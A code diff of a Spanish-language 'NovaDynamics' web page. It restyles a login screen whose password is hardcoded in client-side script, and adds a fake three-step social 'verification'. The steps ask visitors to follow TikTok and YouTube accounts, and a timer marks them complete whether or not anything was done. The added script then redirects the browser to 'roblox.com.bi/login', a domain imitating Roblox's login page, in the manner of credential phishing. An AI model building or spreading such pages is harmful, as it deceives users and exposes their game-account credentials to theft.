@@ -9,7 +9,7 @@
 <style>
 
 /* =========================
-   CONFIGURACIÓN
+   CONFIGURACIÓN GENERAL
 ========================= */
 
 * {
@@ -59,19 +59,13 @@ body {
 
     min-height: 100vh;
 
-    display: flex;
-
-    justify-content: center;
-
-    align-items: center;
-
-    overflow: hidden;
+    overflow-x: hidden;
 
 }
 
 
 /* =========================
-   EFECTO DE FONDO
+   FONDO ANIMADO
 ========================= */
 
 body::before {
@@ -80,24 +74,69 @@ body::before {
 
     position: fixed;
 
-    inset: 0;
+    width: 500px;
 
-    pointer-events: none;
+    height: 500px;
+
+    left: 50%;
+
+    top: 50%;
+
+    transform:
+        translate(-50%, -50%);
 
     background:
 
         radial-gradient(
-            circle at 50% 50%,
-            transparent 0%,
-            rgba(0,0,0,0.12) 60%,
-            rgba(0,0,0,0.4) 100%
+            circle,
+            rgba(99,102,241,0.08),
+            transparent 65%
         );
+
+    filter:
+        blur(30px);
+
+    animation:
+        backgroundPulse 6s
+        ease-in-out
+        infinite;
+
+    pointer-events:
+        none;
+
+}
+
+
+@keyframes backgroundPulse {
+
+    0%,
+    100% {
+
+        transform:
+            translate(-50%, -50%)
+            scale(0.9);
+
+        opacity:
+            0.5;
+
+    }
+
+    50% {
+
+        transform:
+            translate(-50%, -50%)
+            scale(1.15);
+
+        opacity:
+            1;
+
+    }
 
 }
 
 
 /* =========================
-   PANTALLA DE ACCESO
+   PANTALLA LOGIN
 ========================= */
 
 .login-screen {
@@ -118,7 +157,7 @@ body::before {
 
 
 /* =========================
-   CAJA DE LOGIN
+   CAJA LOGIN
 ========================= */
 
 .login-box {
@@ -138,7 +177,8 @@ body::before {
         1px solid
         rgba(255,255,255,0.07);
 
-    border-radius: 18px;
+    border-radius:
+        18px;
 
     backdrop-filter:
         blur(20px);
@@ -151,6 +191,39 @@ body::before {
         0 30px 80px
         rgba(0,0,0,0.45);
 
+    animation:
+        loginAppear
+        0.7s
+        cubic-bezier(.2,.8,.2,1)
+        forwards;
+
+}
+
+
+@keyframes loginAppear {
+
+    from {
+
+        opacity:
+            0;
+
+        transform:
+            translateY(25px)
+            scale(0.96);
+
+    }
+
+    to {
+
+        opacity:
+            1;
+
+        transform:
+            translateY(0)
+            scale(1);
+
+    }
+
 }
 
 
@@ -160,24 +233,31 @@ body::before {
 
 .title {
 
-    font-size: 26px;
+    font-size:
+        26px;
 
-    font-weight: 700;
+    font-weight:
+        700;
 
-    letter-spacing: -0.5px;
+    letter-spacing:
+        -0.5px;
 
-    margin-bottom: 9px;
+    margin-bottom:
+        9px;
 
 }
 
 
 .subtitle {
 
-    color: #8b91a3;
+    color:
+        #8b91a3;
 
-    font-size: 14px;
+    font-size:
+        14px;
 
-    margin-bottom: 28px;
+    margin-bottom:
+        28px;
 
 }
 
@@ -188,50 +268,50 @@ body::before {
 
 .input-wrapper {
 
-    position: relative;
+    position:
+        relative;
 
-    width: 100%;
+    width:
+        100%;
 
-    margin-bottom: 14px;
+    margin-bottom:
+        14px;
 
 }
 
 
 .password-input {
 
-    width: 100%;
+    width:
+        100%;
 
-    height: 50px;
+    height:
+        50px;
 
     padding:
+        0 52px 0 16px;
 
-        0 52px
-
-        0 16px;
-
-    border-radius: 10px;
+    border-radius:
+        10px;
 
     border:
-
         1px solid
         rgba(255,255,255,0.09);
 
     background:
-
         rgba(255,255,255,0.035);
 
-    color: #ffffff;
+    color:
+        #ffffff;
 
-    outline: none;
+    outline:
+        none;
 
-    font-size: 14px;
-
-    text-align: left;
+    font-size:
+        14px;
 
     transition:
-        border-color 0.2s,
-        background 0.2s,
-        box-shadow 0.2s;
+        0.25s;
 
 }
 
@@ -253,7 +333,6 @@ body::before {
         rgba(255,255,255,0.05);
 
     box-shadow:
-
         0 0 0 3px
         rgba(100,110,255,0.08);
 
@@ -261,45 +340,58 @@ body::before {
 
 
 /* =========================
-   BOTÓN OJO
+   OJO
 ========================= */
 
 .eye-button {
 
-    position: absolute;
+    position:
+        absolute;
 
-    right: 13px;
+    right:
+        13px;
 
-    top: 50%;
+    top:
+        50%;
 
     transform:
         translateY(-50%);
 
-    width: 30px;
+    width:
+        30px;
 
-    height: 30px;
+    height:
+        30px;
 
-    display: flex;
+    display:
+        flex;
 
-    align-items: center;
+    align-items:
+        center;
 
-    justify-content: center;
+    justify-content:
+        center;
 
-    border: none;
+    border:
+        none;
 
-    background: transparent;
+    background:
+        transparent;
 
-    color: #858b9b;
+    color:
+        #858b9b;
 
-    cursor: pointer;
+    cursor:
+        pointer;
 
-    font-size: 17px;
+    font-size:
+        17px;
 
-    border-radius: 7px;
+    border-radius:
+        7px;
 
     transition:
-        background 0.2s,
-        color 0.2s;
+        0.2s;
 
 }
 
@@ -316,18 +408,22 @@ body::before {
 
 
 /* =========================
-   BOTÓN ACCEDER
+   BOTÓN ENTRAR
 ========================= */
 
 .login-button {
 
-    width: 100%;
+    width:
+        100%;
 
-    height: 50px;
+    height:
+        50px;
 
-    border: none;
+    border:
+        none;
 
-    border-radius: 10px;
+    border-radius:
+        10px;
 
     background:
 
@@ -337,18 +433,20 @@ body::before {
             #7c5cff
         );
 
-    color: white;
+    color:
+        white;
 
-    font-size: 14px;
+    font-size:
+        14px;
 
-    font-weight: 600;
+    font-weight:
+        600;
 
-    cursor: pointer;
+    cursor:
+        pointer;
 
     transition:
-        transform 0.2s,
-        box-shadow 0.2s,
-        opacity 0.2s;
+        0.2s;
 
 }
 
@@ -356,20 +454,12 @@ body::before {
 .login-button:hover {
 
     transform:
-        translateY(-1px);
+        translateY(-2px);
 
     box-shadow:
 
         0 10px 25px
         rgba(99,102,241,0.25);
-
-}
-
-
-.login-button:active {
-
-    transform:
-        translateY(0);
 
 }
 
@@ -380,83 +470,593 @@ body::before {
 
 .error-message {
 
-    display: none;
+    display:
+        none;
 
-    margin-top: 14px;
+    margin-top:
+        14px;
 
     color:
         #ff6b81;
 
-    font-size: 13px;
+    font-size:
+        13px;
 
 }
 
 
 .error-message.show {
 
-    display: block;
+    display:
+        block;
+
+    animation:
+        shake
+        0.35s;
+
+}
+
+
+@keyframes shake {
+
+    0%,
+    100% {
+
+        transform:
+            translateX(0);
+
+    }
+
+    25% {
+
+        transform:
+            translateX(-6px);
+
+    }
+
+    75% {
+
+        transform:
+            translateX(6px);
+
+    }
 
 }
 
 
 /* =========================
-   PIE
+   FOOTER
 ========================= */
 
 .footer {
 
-    margin-top: 28px;
+    margin-top:
+        28px;
 
     color:
         #555b6b;
 
-    font-size: 11px;
-
-    letter-spacing:
-        0.3px;
+    font-size:
+        11px;
 
 }
 
 
 /* =========================
-   CONTENIDO DESPUÉS DEL LOGIN
+   CONTENIDO PRINCIPAL
 ========================= */
 
 #mainContent {
 
-    display: none;
+    display:
+        none;
 
-    width: 100%;
+    width:
+        100%;
 
-    min-height: 100vh;
+    min-height:
+        100vh;
 
-    justify-content: center;
+    justify-content:
+        center;
 
-    align-items: center;
+    align-items:
+        center;
 
-}
-
-
-.welcome {
-
-    text-align: center;
-
-}
-
-
-.welcome h2 {
-
-    font-size: 28px;
-
-    margin-bottom: 10px;
+    padding:
+        20px;
 
 }
 
 
-.welcome p {
+.main-box {
+
+    width:
+        100%;
+
+    max-width:
+        480px;
+
+    padding:
+        40px 30px;
+
+    text-align:
+        center;
+
+    background:
+        rgba(12,14,23,0.72);
+
+    border:
+        1px solid
+        rgba(255,255,255,0.07);
+
+    border-radius:
+        18px;
+
+    backdrop-filter:
+        blur(20px);
+
+    animation:
+        contentAppear
+        0.6s
+        ease
+        forwards;
+
+}
+
+
+@keyframes contentAppear {
+
+    from {
+
+        opacity:
+            0;
+
+        transform:
+            translateY(20px);
+
+    }
+
+    to {
+
+        opacity:
+            1;
+
+        transform:
+            translateY(0);
+
+    }
+
+}
+
+
+/* =========================
+   TÍTULO VERIFICACIÓN
+========================= */
+
+.main-title {
+
+    font-size:
+        26px;
+
+    margin-bottom:
+        8px;
+
+}
+
+
+.main-subtitle {
 
     color:
         #8b91a3;
+
+    font-size:
+        14px;
+
+    margin-bottom:
+        28px;
+
+}
+
+
+/* =========================
+   CONTADOR
+========================= */
+
+.progress-btn {
+
+    border:
+        none;
+
+    padding:
+        13px 30px;
+
+    border-radius:
+        50px;
+
+    background:
+        linear-gradient(
+            135deg,
+            #6366f1,
+            #7c5cff
+        );
+
+    color:
+        #fff;
+
+    font-weight:
+        700;
+
+    font-size:
+        18px;
+
+    margin-bottom:
+        25px;
+
+    box-shadow:
+        0 8px 25px
+        rgba(99,102,241,0.2);
+
+    transition:
+        0.3s;
+
+}
+
+
+.progress-btn.complete {
+
+    background:
+        linear-gradient(
+            135deg,
+            #10b981,
+            #34d399
+        );
+
+    box-shadow:
+        0 8px 25px
+        rgba(16,185,129,0.2);
+
+}
+
+
+/* =========================
+   PASOS
+========================= */
+
+.steps {
+
+    display:
+        flex;
+
+    flex-direction:
+        column;
+
+    gap:
+        14px;
+
+}
+
+
+.step {
+
+    padding:
+        18px;
+
+    text-align:
+        left;
+
+    border-radius:
+        14px;
+
+    background:
+        rgba(255,255,255,0.035);
+
+    border:
+        1px solid
+        rgba(255,255,255,0.07);
+
+    transition:
+        0.3s;
+
+}
+
+
+.step:hover {
+
+    background:
+        rgba(255,255,255,0.055);
+
+    transform:
+        translateY(-2px);
+
+}
+
+
+.step.done {
+
+    border-color:
+        rgba(16,185,129,0.5);
+
+    background:
+        rgba(16,185,129,0.07);
+
+}
+
+
+.step-header {
+
+    display:
+        flex;
+
+    align-items:
+        center;
+
+    gap:
+        11px;
+
+    margin-bottom:
+        12px;
+
+}
+
+
+.step-number {
+
+    width:
+        30px;
+
+    height:
+        30px;
+
+    border-radius:
+        50%;
+
+    display:
+        flex;
+
+    align-items:
+        center;
+
+    justify-content:
+        center;
+
+    background:
+        #6366f1;
+
+    font-size:
+        13px;
+
+    font-weight:
+        700;
+
+}
+
+
+.step.done .step-number {
+
+    background:
+        #10b981;
+
+}
+
+
+.step-title {
+
+    font-size:
+        14px;
+
+    font-weight:
+        600;
+
+}
+
+
+.step-actions {
+
+    display:
+        flex;
+
+    align-items:
+        center;
+
+    gap:
+        9px;
+
+    flex-wrap:
+        wrap;
+
+}
+
+
+/* =========================
+   BOTONES SOCIALES
+========================= */
+
+.btn {
+
+    padding:
+        9px 15px;
+
+    border-radius:
+        9px;
+
+    text-decoration:
+        none;
+
+    font-size:
+        13px;
+
+    font-weight:
+        600;
+
+    transition:
+        0.2s;
+
+    cursor:
+        pointer;
+
+}
+
+
+.btn-tiktok {
+
+    background:
+        #000;
+
+    color:
+        #fff;
+
+    border:
+        1px solid
+        rgba(255,255,255,0.1);
+
+}
+
+
+.btn-youtube {
+
+    background:
+        #ff0033;
+
+    color:
+        #fff;
+
+}
+
+
+.btn:hover {
+
+    transform:
+        translateY(-2px);
+
+}
+
+
+/* =========================
+   TIMER
+========================= */
+
+.timer {
+
+    display:
+        none;
+
+    padding:
+        7px 11px;
+
+    border-radius:
+        8px;
+
+    color:
+        #facc15;
+
+    background:
+        rgba(250,204,21,0.07);
+
+    font-size:
+        12px;
+
+}
+
+
+.timer.show {
+
+    display:
+        inline-block;
+
+}
+
+
+/* =========================
+   ÉXITO
+========================= */
+
+.success-box {
+
+    display:
+        none;
+
+    margin-top:
+        22px;
+
+    padding:
+        20px;
+
+    border-radius:
+        14px;
+
+    background:
+        rgba(16,185,129,0.08);
+
+    border:
+        1px solid
+        rgba(16,185,129,0.4);
+
+}
+
+
+.success-box.show {
+
+    display:
+        block;
+
+    animation:
+        successAppear
+        0.5s
+        ease;
+
+}
+
+
+@keyframes successAppear {
+
+    from {
+
+        opacity:
+            0;
+
+        transform:
+            scale(0.95);
+
+    }
+
+    to {
+
+        opacity:
+            1;
+
+        transform:
+            scale(1);
+
+    }
+
+}
+
+
+.success-box h2 {
+
+    color:
+        #34d399;
+
+    font-size:
+        20px;
+
+    margin-bottom:
+        8px;
+
+}
+
+
+.success-box p {
+
+    color:
+        #9ca3af;
+
+    font-size:
+        13px;
+
+    line-height:
+        1.5;
 
 }
 
@@ -465,22 +1065,13 @@ body::before {
    MÓVIL
 ========================= */
 
-@media (max-width: 480px) {
+@media (max-width:480px) {
 
-    .login-box {
+    .login-box,
+    .main-box {
 
         padding:
-            35px 22px;
-
-        border-radius:
-            16px;
-
-    }
-
-    .title {
-
-        font-size:
-            24px;
+            32px 20px;
 
     }
 
@@ -494,7 +1085,7 @@ body::before {
 
 
 <!-- =========================
-     PANTALLA DE ACCESO
+     LOGIN
 ========================= -->
 
 <div
@@ -502,102 +1093,273 @@ body::before {
     id="loginScreen"
 >
 
-    <div
-        class="login-box"
-    >
+<div
+    class="login-box"
+>
 
-        <h1 class="title">
-            ACCESO
-        </h1>
+<h1 class="title">
+    ACCESO
+</h1>
 
-        <p class="subtitle">
-            Introduce tu contraseña para continuar
-        </p>
-
-
-        <!-- CONTRASEÑA -->
-
-        <div
-            class="input-wrapper"
-        >
-
-            <input
-                type="password"
-                id="passwordInput"
-                class="password-input"
-                placeholder="Contraseña"
-                autocomplete="off"
-                onkeydown="
-                    if(event.key === 'Enter')
-                    checkPassword()
-                "
-            >
+<p class="subtitle">
+    Introduce tu contraseña para continuar
+</p>
 
 
-            <!-- OJO -->
+<div
+    class="input-wrapper"
+>
 
-            <button
-                type="button"
-                class="eye-button"
-                id="eyeButton"
-                onclick="togglePassword()"
-                aria-label="Mostrar contraseña"
-            >
-                👁
-            </button>
-
-        </div>
-
-
-        <!-- BOTÓN -->
-
-        <button
-            type="button"
-            class="login-button"
-            onclick="checkPassword()"
-        >
-            Entrar
-        </button>
+<input
+    type="password"
+    id="passwordInput"
+    class="password-input"
+    placeholder="Contraseña"
+    autocomplete="off"
+    onkeydown="
+        if(event.key === 'Enter')
+        checkPassword()
+    "
+>
 
 
-        <!-- ERROR -->
+<button
+    type="button"
+    class="eye-button"
+    id="eyeButton"
+    onclick="togglePassword()"
+>
+👁
+</button>
 
-        <div
-            class="error-message"
-            id="errorMessage"
-        >
-            Contraseña incorrecta
-        </div>
+</div>
 
 
-        <div class="footer">
-            NovaDynamics
-        </div>
+<button
+    type="button"
+    class="login-button"
+    onclick="checkPassword()"
+>
+Entrar
+</button>
 
-    </div>
+
+<div
+    class="error-message"
+    id="errorMessage"
+>
+Contraseña incorrecta
+</div>
+
+
+<div class="footer">
+NovaDynamics
+</div>
+
+</div>
 
 </div>
 
 
 <!-- =========================
-     CONTENIDO PROTEGIDO
+     VERIFICACIÓN
 ========================= -->
 
 <div
     id="mainContent"
 >
 
-    <div class="welcome">
+<div
+    class="main-box"
+>
 
-        <h2>
-            Acceso concedido
-        </h2>
+<h1 class="main-title">
+    Verificación
+</h1>
 
-        <p>
-            Bienvenido a NovaDynamics.
-        </p>
+<p class="main-subtitle">
+    Completa los 3 pasos para continuar
+</p>
 
-    </div>
+
+<button
+    class="progress-btn"
+    id="progressBtn"
+>
+0 / 3
+</button>
+
+
+<div
+    class="steps"
+>
+
+
+<!-- PASO 1 -->
+
+<div
+    class="step"
+    id="step1"
+>
+
+<div class="step-header">
+
+<div class="step-number">
+1
+</div>
+
+<div class="step-title">
+Sígueme en TikTok
+</div>
+
+</div>
+
+
+<div class="step-actions">
+
+<a
+    href="https://www.tiktok.com/@novadynamics"
+    target="_blank"
+    rel="noopener"
+    class="btn btn-tiktok"
+    id="link1"
+    onclick="startVerification(1)"
+>
+🎵 Abrir TikTok
+</a>
+
+
+<span
+    class="timer"
+    id="timer1"
+>
+⏱️ 5s
+</span>
+
+</div>
+
+</div>
+
+
+<!-- PASO 2 -->
+
+<div
+    class="step"
+    id="step2"
+>
+
+<div class="step-header">
+
+<div class="step-number">
+2
+</div>
+
+<div class="step-title">
+Dale like a mi último video
+</div>
+
+</div>
+
+
+<div class="step-actions">
+
+<a
+    href="https://www.tiktok.com/@novadynamics"
+    target="_blank"
+    rel="noopener"
+    class="btn btn-tiktok"
+    id="link2"
+    onclick="startVerification(2)"
+>
+❤️ Dale like a mi último video
+</a>
+
+
+<span
+    class="timer"
+    id="timer2"
+>
+⏱️ 5s
+</span>
+
+</div>
+
+</div>
+
+
+<!-- PASO 3 -->
+
+<div
+    class="step"
+    id="step3"
+>
+
+<div class="step-header">
+
+<div class="step-number">
+3
+</div>
+
+<div class="step-title">
+Sígueme en YouTube
+</div>
+
+</div>
+
+
+<div class="step-actions">
+
+<a
+    href="https://www.youtube.com/@Alejandro_2021vs?sub_confirmation=1"
+    target="_blank"
+    rel="noopener"
+    class="btn btn-youtube"
+    id="link3"
+    onclick="startVerification(3)"
+>
+▶️ Suscribirme
+</a>
+
+
+<span
+    class="timer"
+    id="timer3"
+>
+⏱️ 5s
+</span>
+
+</div>
+
+</div>
+
+</div>
+
+
+<!-- ÉXITO -->
+
+<div
+    class="success-box"
+    id="successBox"
+>
+
+<h2>
+¡Completado! 🎉
+</h2>
+
+<p>
+Has terminado los 3 pasos.
+<br>
+Redirigiendo...
+</p>
+
+</div>
+
+
+<div class="footer">
+NovaDynamics · Verificación social
+</div>
+
+</div>
 
 </div>
 
@@ -608,7 +1370,8 @@ body::before {
    CONTRASEÑA
 ========================= */
 
-const PASSWORD = "nova2026";
+const PASSWORD =
+"nova2026";
 
 
 /* =========================
@@ -632,25 +1395,19 @@ function togglePassword() {
         input.type === "password"
     ) {
 
-        input.type = "text";
+        input.type =
+            "text";
 
-        eye.textContent = "🙈";
-
-        eye.setAttribute(
-            "aria-label",
-            "Ocultar contraseña"
-        );
+        eye.textContent =
+            "🙈";
 
     } else {
 
-        input.type = "password";
+        input.type =
+            "password";
 
-        eye.textContent = "👁";
-
-        eye.setAttribute(
-            "aria-label",
-            "Mostrar contraseña"
-        );
+        eye.textContent =
+            "👁";
 
     }
 
@@ -699,7 +1456,8 @@ function checkPassword() {
             "flex";
 
 
-        input.value = "";
+        input.value =
+            "";
 
 
     } else {
@@ -709,9 +1467,265 @@ function checkPassword() {
         );
 
 
-        input.value = "";
+        input.value =
+            "";
 
         input.focus();
+
+    }
+
+}
+
+
+/* =========================
+   SISTEMA DE PASOS
+========================= */
+
+let completed = [
+
+    false,
+
+    false,
+
+    false
+
+];
+
+
+let timers = [
+
+    null,
+
+    null,
+
+    null
+
+];
+
+
+/* =========================
+   INICIAR PASO
+========================= */
+
+function startVerification(step) {
+
+    const index =
+        step - 1;
+
+
+    if (
+        completed[index] ||
+        timers[index]
+    ) {
+
+        return;
+
+    }
+
+
+    const link =
+        document.getElementById(
+            `link${step}`
+        );
+
+
+    const timerEl =
+        document.getElementById(
+            `timer${step}`
+        );
+
+
+    link.style.pointerEvents =
+        "none";
+
+
+    link.style.opacity =
+        "0.5";
+
+
+    timerEl.classList.add(
+        "show"
+    );
+
+
+    let secondsLeft =
+        5;
+
+
+    timerEl.textContent =
+        `⏱️ ${secondsLeft}s`;
+
+
+    timers[index] =
+
+        setInterval(
+            () => {
+
+                secondsLeft--;
+
+
+                timerEl.textContent =
+                    `⏱️ ${secondsLeft}s`;
+
+
+                if (
+                    secondsLeft <= 0
+                ) {
+
+                    clearInterval(
+                        timers[index]
+                    );
+
+
+                    timers[index] =
+                        null;
+
+
+                    completed[index] =
+                        true;
+
+
+                    updateUI();
+
+                }
+
+            },
+
+            1000
+
+        );
+
+}
+
+
+/* =========================
+   ACTUALIZAR INTERFAZ
+========================= */
+
+function updateUI() {
+
+    const count =
+        completed.filter(
+            Boolean
+        ).length;
+
+
+    const progressBtn =
+        document.getElementById(
+            "progressBtn"
+        );
+
+
+    progressBtn.textContent =
+        `${count} / 3`;
+
+
+    for (
+        let i = 1;
+        i <= 3;
+        i++
+    ) {
+
+        const stepEl =
+            document.getElementById(
+                `step${i}`
+            );
+
+
+        const link =
+            document.getElementById(
+                `link${i}`
+            );
+
+
+        const timerEl =
+            document.getElementById(
+                `timer${i}`
+            );
+
+
+        if (
+            completed[i - 1]
+        ) {
+
+            stepEl.classList.add(
+                "done"
+            );
+
+
+            link.style.pointerEvents =
+                "none";
+
+
+            link.style.opacity =
+                "0.5";
+
+
+            if (
+                i === 1
+            ) {
+
+                link.textContent =
+                    "✅ TikTok completado";
+
+            }
+
+            else if (
+                i === 2
+            ) {
+
+                link.textContent =
+                    "✅ Like completado";
+
+            }
+
+            else {
+
+                link.textContent =
+                    "✅ Suscrito";
+
+            }
+
+
+            timerEl.classList.remove(
+                "show"
+            );
+
+        }
+
+    }
+
+
+    if (
+        count === 3
+    ) {
+
+        progressBtn.classList.add(
+            "complete"
+        );
+
+
+        document
+            .getElementById(
+                "successBox"
+            )
+            .classList.add(
+                "show"
+            );
+
+
+        setTimeout(
+            () => {
+
+                window.location.href =
+
+                "https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F709199129093%2Fprofile";
+
+            },
+
+            1500
+
+        );
 
     }
 
